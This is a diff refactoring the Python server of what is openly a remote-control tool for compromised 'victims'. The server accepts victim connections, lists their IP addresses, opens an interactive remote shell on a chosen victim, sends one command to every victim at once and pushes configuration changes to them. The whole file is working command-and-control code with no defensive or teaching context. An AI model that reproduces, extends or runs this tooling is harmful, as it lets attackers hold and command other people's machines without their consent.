@@ -3,16 +3,51 @@ from threading import Thread
 import sys
 import time
 from local_libs.config import parse_config
-
-victims_sockets = []
-victims_connections_log = []
-current_victim = None
+from local_libs.env_vars import *
 
 
-class Socket:
-    @staticmethod
-    def get_ip(sock):
-        return sock.getpeername()[0]
+def get_ip(self):
+    return self.getpeername()[0]
+
+socket.socket.get_ip = get_ip
+
+
+class Connections:
+    def __init__(self):
+        self.victims_sockets = []
+        self.connections_log = {
+            "connected": [],
+            "disconnected": []
+        }
+        self.current_victim = None
+
+    def get_victims(self):
+        return self.victims_sockets
+
+    def append_victim(self, v_socket):
+        self.victims_sockets.append(v_socket)
+
+    def remove_victim(self, v_socket):
+        self.victims_sockets.remove(v_socket)
+
+    def append_log(self, address):
+        self.connections_log["connected"].append(address)
+
+    def remove_log(self, address):
+        self.connections_log["disconnected"].append(address)
+
+    def __remove_temp_log(self, action, address):
+        self.connections_log[action].remove(address)
+
+    def show_log(self):
+        for address in self.connections_log["connected"]:
+            print(f"[+] {address} connected")
+            self.__remove_temp_log("connected", address)
+        for address in self.connections_log["disconnected"]:
+            print(f"[+] {address} disconnected")
+            self.__remove_temp_log("disconnected", address)
+
+connections = Connections()
 
 
 class Cli:
@@ -35,7 +70,7 @@ class Cli:
 
     def handle(self):
         while True:
-            self.__show_connections_log()
+            connections.show_log()
             try:
                 command_number = int(input("Enter commands number >>> "))
                 command_method = self.cli_commands[command_number][1]
@@ -50,57 +85,82 @@ class Cli:
             print(f"({n}) {c}")
         print("")
 
-    def __show_connections_log(self):
-        global victims_connections_log
-        for address in victims_connections_log:
-            print(f"[+] {address} connected")
-            victims_connections_log.remove(address)
-
     def __print_list_of_victims(self):
-        global victims_sockets
+        victims_sockets = connections.get_victims()
         if len(victims_sockets) != 0:
             for v_socket in victims_sockets:
                 print("Victims ip addresses list:")
-                print(Socket.get_ip(v_socket))
+                print(v_socket.get_ip())
         else:
             print("There are no victims")
 
     def __connect_to_victim(self):
-        global current_victim
         victim_ip = input("Enter victims ip >>> ")
         v_socket = Server.get_socket_by_ip(victim_ip)
         if v_socket:
-            current_victim = victim_ip
-            print(f"Successful connected to {victim_ip}")
-            v_socket.send("start shell".encode("utf-8"))
-            print(v_socket.recv(1024 * 4).decode("utf-8"), end="")
-            while True:
-                command = input()
-                if command == "exit":
-                    print("Exiting...")
-                    break
-                elif command.find("change config") == 0:
-                    command = command.split(" ")
-                    new_config = parse_config(command[-1])
-                    command[-1] = new_config
-                    command = " ".join(command)
-                v_socket.send(command.encode("utf-8"))
-                print(v_socket.recv(1024 * 1024).decode("utf-8"), end="")
+            connections.current_victim = victim_ip
+            victim = Victim(victim_ip, v_socket)
+            victim.connect()
         else:
             print(f"IP {victim_ip} not founded")
-        current_victim = None
+        connections.current_victim = None
 
     def __send_all(self):
+        victims_sockets = connections.get_victims()
         command = input("Enter command >> ")
         for v_socket in victims_sockets:
-            v_socket.send(command.encode("utf-8"))
-            print(f"{Socket.get_ip(v_socket)} accepted command")
+            victim_ip = v_socket.get_ip()
+            print(f"\nIP {victim_ip} ↓")
+            Victim.handle_command(v_socket, command)
+            print(f"\n{victim_ip} accepted command")
+        print("")
 
     def __exit(self):
-        global victims_sockets
+        victims_sockets = connections.get_victims()
         for v_socket in victims_sockets:
             v_socket.close()
         sys.exit(0)
+
+
+class Victim:
+    def __init__(self, ip, v_socket):
+        self.ip = ip
+        self.v_socket = v_socket
+    
+    def __start_shell(self):
+        self.v_socket.send("start shell".encode("utf-8"))
+        print(self.v_socket.recv(1024 * 4).decode("utf-8"), end="")
+    
+    def connect(self):
+        print(f"Successful connected to {self.ip}")
+        self.__start_shell()
+        while True:
+            command = input()
+            if command == "exit":
+                print("Exiting...")
+                break
+            else:
+                try:
+                    Victim.handle_command(self.v_socket, command)
+                except Exception as error:
+                    print(f"Error: {error}")
+    
+    @staticmethod
+    def handle_command(v_socket, command):
+        command = Victim.handle_service_command(command)
+        v_socket.send(command.encode("utf-8"))
+        print(v_socket.recv(1024 * 1024).decode("utf-8"), end="")
+    
+    @staticmethod
+    def handle_service_command(command, v_socket=None):
+        if command.find("change config") == 0:
+            command = command.split(" ")
+            new_config = parse_config(command[-1])
+            command[-1] = new_config
+            command = " ".join(command)
+            return command
+        else:
+            return command
 
 
 class Server:
@@ -126,36 +186,35 @@ class Server:
         t2.start()
 
     def accepting_victims(self):
-        global victims_sockets
         while True:
             v_socket, v_address = self.s.accept()
-            # print(f"\n[+] {v_address[0]} connected")
-            victims_connections_log.append(v_address[0])
-            victims_sockets.append(v_socket)
+            connections.append_victim(v_socket)
+            connections.append_log(v_address[0])
 
     def check_available_victims(self):
-        global victims_sockets, current_victim
+        victims_sockets = connections.get_victims()
         while True:
             for v_socket in victims_sockets:
-                if Socket.get_ip(v_socket) == current_victim:  # doesn't work
+                if v_socket.get_ip() == connections.current_victim:  # doesn't work
                     continue
                 else:
                     try:
                         v_socket.send("hello".encode())
                     except:
+                        connections.remove_log(v_socket.get_ip())
+                        connections.remove_victim(v_socket)
                         v_socket.close()
-                        victims_sockets.remove(v_socket)
                 time.sleep(1)
 
     @staticmethod
     def get_socket_by_ip(ip):
-        global victims_sockets
+        victims_sockets = connections.get_victims()
         for v_socket in victims_sockets:
-            if Socket.get_ip(v_socket) == ip:
+            if v_socket.get_ip() == ip:
                 return v_socket
         return None
 
 
 if __name__ == "__main__":
-    Server("0.0.0.0", 8888).run()
+    Server("0.0.0.0", DEFAULT_SERVER_PORT).run()
     Cli().start()
